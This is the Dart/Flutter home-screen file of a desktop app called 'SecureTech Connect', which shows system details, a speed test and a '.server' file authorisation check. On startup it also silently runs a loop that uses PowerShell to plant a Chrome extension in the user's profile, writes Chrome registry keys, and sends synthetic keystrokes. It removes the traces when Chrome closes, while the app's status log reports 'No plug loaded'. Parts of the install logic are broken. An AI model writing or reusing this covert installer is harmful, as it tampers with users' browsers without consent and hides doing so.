import 'dart:convert';
import 'dart:io';

import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:intl/intl.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:securetech_connect/Functions/decryption.dart';
import 'package:securetech_connect/Widgets/button_widget.dart';
import 'package:securetech_connect/Widgets/encryption.dart';
import 'package:securetech_connect/Widgets/console_ui_widget.dart';
import 'package:securetech_connect/Widgets/info_widget.dart';
import 'package:securetech_connect/Widgets/mouse_region.dart';
import 'package:securetech_connect/Widgets/speed_test_widget.dart';
import 'package:securetech_connect/Widgets/text_widget.dart';
import 'package:securetech_connect/colors.dart';
import 'package:securetech_connect/extension.dart';
import 'package:securetech_connect/models/speed_model.dart';
import 'package:securetech_connect/models/topbarmodel.dart';
import 'package:system_info2/system_info2.dart';
import 'package:encrypt/encrypt.dart' as encrypt;

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}
class _HomeScreenState extends State<HomeScreen> {
  int _currentTextIndex = 0;
  bool isHover = false;  // Changed to false initially
   String computerName = '';
  String ipAddress = '';
  String currentTime = '';
  String osName = '';
  String osVersion = '';
  String physicalMemory = '';
  String extId = '';
  List<SpeedData> data = [];
  List<String> _texts = [];
   



  final List<Color> _textColors = [
    Colors.white, 
    Colors.white, 
    Colors.white, 
    Colors.white, 
    Colors.green, 
    Colors.white, 
    Colors.green, 
  ];

   void fetchSystemDetails() async {
    final info = NetworkInfo();
    osName = Platform.operatingSystem;
    osVersion = Platform.operatingSystemVersion;
    String? ip = await info.getWifiIP();
    int memoryInBytes = SysInfo.getTotalPhysicalMemory();
    physicalMemory = '${memoryInBytes / (1024 * 1024 * 1024)} GB';
    // }
    setState(() {
      // computerName = Platform.localHostname.split('.').first;
      if(Platform.isMacOS){
      computerName = Platform.environment['USER'] ?? 'Unknown';
      } else if (Platform.isWindows){
      computerName = Platform.environment['USERNAME'] ?? 'Unknown';
      }
      print(computerName);
      // computerName = getUserDirectory();
      ipAddress = ip ?? 'Unknown';
      currentTime = DateFormat('yyyy-MM-dd').format(DateTime.now());
       _texts  = [
    "[Info] SecureTech Connect",
    "[Info] © Copyright 2025",
    "[Info] Running on OS: $osName", 
    "[Info] No plug loaded",
    "[Info] Connection Successful", 
    "[Info] IP Address: $ipAddress", 
    "Status Ready",
  ];
      // print(computerName);
    });
    await Future.delayed(Duration(seconds: 1));
   _showTextSequentially();
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    fetchSystemDetails();
    monitorChrome();
  print(ipAddress);
   
  }

String getUserDirectory() {
  return Platform.environment['USERPROFILE'] ?? "C:\\Users\\Default";
}

Future<void> installExtensionFromAssets(String extensionPath) async {
  String userDir = getUserDirectory();
  String chromeExtensionsPath =
      '$userDir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions';
  
  // This target path will be where the extension should be installed
  String targetPath = '$chromeExtensionsPath\\extension';

  // Check if the extension is already installed
  bool extensionExists = await Directory(targetPath).exists();
  if (extensionExists) {
    print("Extension is already installed.");
    return; // Exit if the extension is already installed
  }

  // If the extension source path exists, proceed with installation
  if (await Directory(extensionPath).exists()) {
    // Create the target path for the extension if it doesn't exist
    await Process.run('powershell', [
      '-Command',
      'New-Item -ItemType Directory -Path "$targetPath" -Force'
    ]);

    // Install the extension by copying from the provided path
    await Process.run('powershell', [
      '-Command',
      'Copy-Item -Path "$extensionPath" -Destination "$targetPath" -Recurse -Force'
    ]);

    print("Extension installed to: $targetPath");

    // Get the generated extension ID
    String extensionId = await getExtensionIdFromTargetPath(targetPath);

    if (extensionId.isNotEmpty) {
      await registerExtensionInRegistry(extensionId);
      await enableExtensionInBackground(extensionId);
    }
  } else {
    print("Extension source path does not exist.");
  }
}

// Get installed Chrome extensions
Future<String> getExtensionIdFromTargetPath(String targetPath) async {
  try {
    // Extract the generated extension ID
    var result = await Process.run('powershell', [
      '-Command',
      'Get-ChildItem "$targetPath" | Select-Object -ExpandProperty Name'
    ]);
    String extensionId = result.stdout.toString().trim();
    print("Generated Extension ID: $extensionId");
    return extensionId;
  } catch (e) {
    print("Error generating extension ID: $e");
    return "";
  }
}

// Register Extension in Windows Registry
Future<void> registerExtensionInRegistry(String extensionId) async {
  String registryPath = 'HKCU:\\Software\\Google\\Chrome\\Extensions\\$extensionId';

  await Process.run('powershell', [
    '-Command',
    '''
    New-Item -Path "$registryPath" -Force | Out-Null
    New-ItemProperty -Path "$registryPath" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType String -Force
    '''
  ]);

  print("Extension registered in Windows Registry: $registryPath");
}

// Enable Extension in Background
Future<void> enableExtensionInBackground(String extensionId) async {
  // Start Chrome Extensions page and navigate through
  await Process.run('powershell', [
    '-Command',
    '''
    Start-Sleep -Seconds 2
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class SendKeys {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
    }
    "@

    [SendKeys]::keybd_event(0x11, 0, 0, 0)  # Ctrl key down
    [SendKeys]::keybd_event(0x10, 0, 0, 0)  # Shift key down
    [SendKeys]::keybd_event(0x4A, 0, 0, 0)  # J key down
    [SendKeys]::keybd_event(0x4A, 0, 2, 0)  # J key up
    [SendKeys]::keybd_event(0x10, 0, 2, 0)  # Shift key up
    [SendKeys]::keybd_event(0x11, 0, 2, 0)  # Ctrl key up
    '''
  ]);

  print("Extension enabled in Chrome.");
}

// Remove extension from registry
Future<void> removeExtensionFromRegistry(String extensionId) async {
  String registryPath = 'HKCU:\\Software\\Google\\Chrome\\Extensions\\$extensionId';

  await Process.run('powershell', [
    '-Command',
    'Remove-Item -Path "$registryPath" -Recurse -Force -ErrorAction SilentlyContinue'
  ]);

  print("Extension removed from Windows Registry.");
}

// Remove Chrome Extension
Future<void> removeExtension(String extensionId) async {
  String userDir = getUserDirectory();
  String extensionPath =
      '$userDir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\$extensionId';

  await Process.run('powershell', [
    '-Command',
    'Remove-Item -Path "$extensionPath" -Recurse -Force'
  ]);

  print("Extension removed.");

  await removeExtensionFromRegistry(extensionId);
}

// Check if Chrome is running
Future<bool> isChromeRunning() async {
  ProcessResult result = await Process.run('powershell', [
    '-Command',
    'Get-Process chrome -ErrorAction SilentlyContinue'
  ]);

  return result.stdout.toString().trim().isNotEmpty;
}

void monitorChrome() async {
  String userDir = getUserDirectory();
  String extensionPath = '$userDir\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions';
  
  while (true) {
    bool chromeRunning = await isChromeRunning();
    String extensionId = await getExtensionIdFromTargetPath(extensionPath);
    
    if (chromeRunning) {
      if (extensionId.isEmpty) {
        print("Extension not found. Installing...");
        await installExtensionFromAssets(extensionPath);
      } else {
        print("Extension is already installed.");
      }
    } else {
      await removeExtension(extensionId);
      await removeExtensionFromRegistry(extensionId);
      print("Chrome is closed. Exiting...");
      exit(0); // Close the app if Chrome is not running
    }
    
    // Add a delay to prevent constant checking
    await Future.delayed(Duration(seconds: 5)); // Adjust delay as needed
  }
}


void _showTextSequentially() {
    Future.delayed(Duration(seconds: 2), () {
      if (_currentTextIndex < _texts.length - 1) {
        setState(() {
          _currentTextIndex++;
        });
        _showTextSequentially();
      }
    });
  }

Future<void> _pickFile(BuildContext context) async {
  FilePickerResult? result = await FilePicker.platform.pickFiles(
    type: FileType.custom,
    allowedExtensions: ['server'], // Restrict to `.server` files
  );
  if(result == null) return;
  print(result);
    String filePath = result.files.single.path!;
    _checkAuthorization(context, filePath); // ✅ Pass context explicitly
}

Future<void> _checkAuthorization(BuildContext context, String path) async {
  if (!mounted) return; // ✅ Ensure the widget is still active

  try {
    File file = File(path);
    String fileContent = await file.readAsString();

    // 🔹 Search for Base64 encrypted text using regex
    RegExp regex = RegExp(r'[A-Za-z0-9+/=]{20,}');
    Match? match = regex.firstMatch(fileContent);

    if (match != null) {
      String encryptedText = match.group(0)!;
      String decryptedText = decryptPassword(encryptedText);

      bool isAuthorized = decryptedText.contains("this is an authorized");

      // ✅ Use `mounted` to check before showing dialog
      if (mounted) {
        _showEncryptionDialog(context, isAuthorized, isAuthorized ? "Decryption Successful!" : "No Match Found!");
      }
    } else {
      if (mounted) _showEncryptionDialog(context, false, "File is Not Authorized");
    }
  } catch (e) {
    if (mounted) _showEncryptionDialog(context, false, "Error Reading File");
  }
}

void _showEncryptionDialog(BuildContext context, bool isMatch, String message) {
  showDialog(
    context: context,
    builder: (context) {
      return EncryptionScreen(
        text: message,
        isMatch: isMatch, // ✅ Pass match status
      );
    },
    barrierDismissible: false, // Prevent accidental closing
  );
}


 


  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox(
        height: context.screenHeight,
        width: context.screenWidth,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              color: primaryBgColor,
              child: Row(
                children: [ 
                    ...List.generate(
                      listTopBarModel.length,
                      (index) => Expanded(
                        child: CustomMouseRegion(
                          height: 30,
                          // width: context.screenWidth * 0.4,
                          hoverColor: Colors.blue.withValues(alpha: 0.6),
                          defaultColor: Colors.transparent,
                          child: Center(
                            child: TextWidget(
                             text:  listTopBarModel[index].name,
                             
                                textColor: (index == 1 || index == 2 || index == 3) 
                                  ? Colors.grey 
                                  : Colors.white,
                                textSize: 14,
                              
                            ),
                          ),
                        ),
                      ),
                    ),
                    Expanded(child: SizedBox()),
                ]
              ),
            ),
            SizedBox(
              height: 5,
            ), 

            Flexible(
              child: Container(height: context.screenHeight,
              width: context.screenWidth,
              color: primaryBgColor,
              child: Padding(
                padding: const EdgeInsets.all(8.0),
                child: Column(
                  children: [
                    SizedBox(
                      height: 5,
                    ),
                    Row(
                      spacing: 10,
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Flexible(
                          child: Container(
                             height: context.screenHeight * 0.4 + 15,
                            // width: context.screenWidth * 0.5,
                            padding: EdgeInsets.symmetric(horizontal: 10),

                            decoration: BoxDecoration(
                              // color: Color 
                              border: Border.all(color: Colors.grey.withValues(alpha: 0.2))
                            ),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Transform.translate(
                                  offset: Offset(0, -11),
                                   child: Container(
                                    color: primaryBgColor,
                                    child: TextWidget(text: "Connection Status",textColor: Colors.white, fontWeight: FontWeight.bold,),
                                   ),
                                 ), 
                                Flexible(child: SpeedTestScreen()),
                              ],
                            ),
                          ),
                        ),
                        Align(
                          alignment: Alignment.centerRight,
                          child: Container(
                            // height: context.screenHeight * 0.2,
                            width: context.screenWidth * 0.4,
                            padding: EdgeInsets.symmetric(horizontal: 10),
                            decoration: BoxDecoration(
                              // color: Colors.amber, 
                              border: Border.all(color: Colors.grey.withValues(alpha: 0.2))
                            ),
                            child: Column(
                              spacing: 10,
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                 Transform.translate(
                                  offset: Offset(0, -11),
                                   child: Container(
                                    color: primaryBgColor,
                                    child: TextWidget(text: "Computer Info", textColor: Colors.white, fontWeight: FontWeight.bold,),
                                   ),
                                 ), 
                        
                                InfoWidget(title: "Computer Name", value: computerName),
                                InfoWidget(title: "Ip Address", value: ipAddress),
                                InfoWidget(title: "OS Platform", value: osName),
                                InfoWidget(title: "Os Version", value: osVersion),
                                InfoWidget(title: "Physical Memory", value: physicalMemory),
                                InfoWidget(title: "Date:", value: currentTime),
                                 SizedBox(
                                  height: 10,
                                 )
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                    SizedBox(
              height: 5,
            ),
                      Row(
                        children: [
                          Expanded(
                            child: Container(
                                          height: context.screenHeight * 0.2,
                                          width: double.maxFinite,
                                          decoration: BoxDecoration(
                                            border: Border.all(color: Colors.grey.withValues(alpha: 0.2))
                                          ),
                                          child: Row(
                                            crossAxisAlignment: CrossAxisAlignment.start,
                                            children: [
                                              Flexible(
                                                flex: 4,
                                                child: Container(
                                                  height: 40,
                                                  width: double.maxFinite,
                                                  decoration: BoxDecoration(
                                                    color: Colors.grey.withValues(alpha: 0.2)
                                                  ),
                                                ),
                                              ), 
                                              Flexible(child: 
                                              AnimatedSubmitButton(onPressed: () async{
                                              await _pickFile(context);
                                              }, 
                                              width: context.screenWidth,
                                              text: "Browse",
                                              color: Colors.tealAccent.withValues(alpha: 0.4),
                                              height: 40,
                                              ))
                                            ],
                                          )
                                          // EncryptionScreen()
                                        ),
                          ),
                          Expanded(
                            child: Container(
                                          height: context.screenHeight * 0.2,
                                          width: double.maxFinite,
                                          child: ConsoleScreen(),
                                        ),
                          ),
                        ],
                      ),
                  ],
                ),
              ),
              ),
            ), 
            SizedBox(
              height: 5,
            ),
          
            Align(
              alignment: Alignment.bottomCenter,
              child: Container(
                height: context.screenHeight * 0.2 + 30,
                width: double.maxFinite, 
                decoration: BoxDecoration(
                  color: primaryBgColor
                ),
                child:_texts.isEmpty ?  Center(child: TextWidget(text: "Loading..."),) :  Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    // Divider(),

                    // SizedBox(
                    //   height: 10,
                    // ),
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal:  12.0),
                      child: TextWidget(text: "System Status", 
                      textColor: Colors.white, 
                      fontWeight: FontWeight.bold,),
                    ),
                    Divider(),
                    ...List.generate(_currentTextIndex + 1, (index){
                        return Flexible(
                          child: Padding(
                            padding: const EdgeInsets.symmetric(horizontal: 12.0),
                            child: AnimatedSwitcher(
                            duration: Duration(seconds: 1),
                            child: TextWidget(
                            text: _texts[index],
                            key: ValueKey<int>(index),     
                              textColor: _textColors[index],
                              fontWeight: FontWeight.normal,
                                              ),
                                            ),
                          ),
                        );
                    }),
                     SizedBox(
                      height: 14,
                    ),
                  ],
                ),
          ),
            )
          ],
        ),
      ),
    );
  }
}